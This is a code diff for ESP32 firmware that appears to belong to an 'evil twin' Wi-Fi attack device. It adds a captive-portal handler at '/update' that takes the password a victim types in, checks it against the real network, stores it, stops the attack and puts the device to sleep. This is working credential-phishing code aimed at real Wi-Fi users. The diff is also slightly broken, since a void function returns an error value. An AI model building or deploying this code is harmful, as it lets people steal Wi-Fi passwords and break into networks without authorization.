@@ -5,6 +5,7 @@
 #include "freertos/task.h"
 #include "esp_system.h"
 #include "spi_flash_mmap.h"
+#include "esp_sleep.h"
 
 #include "esp_wifi.h"
 #include "esp_event.h"
@@ -148,6 +149,44 @@ static void firmware_upgrade_index_manager(httpd_req_t *req)
 
 
 /**
+ * @brief Get user input password ad save it
+ * 
+ * @param req 
+ */
+static void save_password_manager(httpd_req_t *req)
+{
+	char buffer[256];
+    int ret;
+
+    ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
+    if (ret <= 0) {
+        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
+            httpd_resp_send_408(req);
+        }
+        return ESP_FAIL;
+    }
+
+	char password[64] = {0};
+    sscanf(buffer, "password=%63[^&]", password);
+
+	/* Check password and send response */
+	if( evil_twin_check_password(password) != ESP_OK )
+	{
+		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
+		httpd_resp_send(req, NULL, 0);
+		return;
+	}
+	
+	/* Save password and stop attack */
+	evil_twin_stop_attack();
+
+	/* Enter in deep sleep to preserve battery power */
+	/* Only hardware wakeup (Reset button) */
+	esp_deep_sleep_start();
+}
+
+
+/**
  * @brief All request all redirected here
  * 
  * @param req 
@@ -176,6 +215,11 @@ static void captive_portal_redirect(httpd_req_t *req)
 				break;
 		}
 		return;
+	}
+	/* Save password (keep it the same for alla attacks)*/
+	else if( strcmp(req->uri, "/update") == 0 )
+	{
+		save_password_manager(req);
 	}
 	/* loader.html same for all */
 	else if( strcmp(req->uri, "/loader.html") == 0 )
